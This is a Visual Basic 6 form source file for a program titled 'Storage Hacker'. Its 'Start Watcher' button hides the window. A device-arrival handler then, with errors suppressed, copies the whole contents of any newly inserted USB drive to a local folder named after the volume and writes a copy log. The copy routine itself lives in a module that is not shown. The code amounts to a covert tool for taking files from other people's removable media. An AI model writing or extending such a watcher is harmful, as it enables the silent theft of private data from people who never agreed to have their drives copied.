VERSION 5.00
Object = "{6FBA474E-43AC-11CE-9A0E-00AA0062BB4C}#1.0#0"; "SYSINFO.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "Storage Hacker"
   ClientHeight    =   3870
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   6990
   LinkTopic       =   "Form1"
   ScaleHeight     =   3870
   ScaleWidth      =   6990
   StartUpPosition =   3  '´°¿ÚÈ±Ê¡
   Begin VB.CommandButton Command1 
      Caption         =   "Start Watcher"
      BeginProperty Font 
         Name            =   "Î¢ÈíÑÅºÚ"
         Size            =   18
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   975
      Left            =   2520
      TabIndex        =   1
      Top             =   2280
      Width           =   2055
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   3240
      Top             =   1680
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox Text1 
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Î¢ÈíÑÅºÚ"
         Size            =   12
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   1080
      TabIndex        =   0
      Top             =   1560
      Width           =   5535
   End
   Begin SysInfoLib.SysInfo SysInfo1 
      Left            =   840
      Top             =   2040
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin VB.Label Label4 
      BackStyle       =   0  'Transparent
      Caption         =   "Powered by @Hebingchang"
      BeginProperty Font 
         Name            =   "Î¢ÈíÑÅºÚ"
         Size            =   10.5
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   3720
      TabIndex        =   5
      Top             =   480
      Width           =   3255
   End
   Begin VB.Label Label3 
      Caption         =   "Save Path"
      Height          =   255
      Left            =   120
      TabIndex        =   4
      Top             =   1680
      Width           =   855
   End
   Begin VB.Label Label2 
      BackStyle       =   0  'Transparent
      Caption         =   "Storage Hacker"
      BeginProperty Font 
         Name            =   "Î¢ÈíÑÅºÚ"
         Size            =   21.75
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   735
      Left            =   240
      TabIndex        =   3
      Top             =   240
      Width           =   3255
   End
   Begin VB.Label Label1 
      BackColor       =   &H00800000&
      BeginProperty Font 
         Name            =   "Î¢ÈíÑÅºÚ"
         Size            =   21.75
         Charset         =   134
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   975
      Left            =   0
      TabIndex        =   2
      Top             =   0
      Width           =   6975
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public StrID As String
Public TargetPath As String
Public CopyLog As String

Private Sub Command1_Click()
    Me.Hide
End Sub

Private Sub Form_Load()
    Text1.Text = App.Path
End Sub

Private Sub SysInfo1_DeviceArrival(ByVal DeviceType As Long, ByVal DeviceID As Long, ByVal DeviceName As String, ByVal DeviceData As Long)
On Error Resume Next
    StrID = GetDeviceID(DeviceID)
    Set fso = CreateObject("scripting.filesystemobject")
    Set drv = fso.GetDrive(StrID & ":")
    TargetPath = Text1.Text & "\" & drv.volumename
    'MkDir TargetPath
    Scan.SosuoFile StrID & ":\", TargetPath
    Open TargetPath & "\log.log" For Output As #1
    Print #1, CopyLog
    Close #1
    CopyLog = ""
    
End Sub

Private Function GetDeviceID(ID As Long) As String
    intid = Log(ID) / Log(2)
    GetDeviceID = Chr(Asc("A") + intid)
End Function

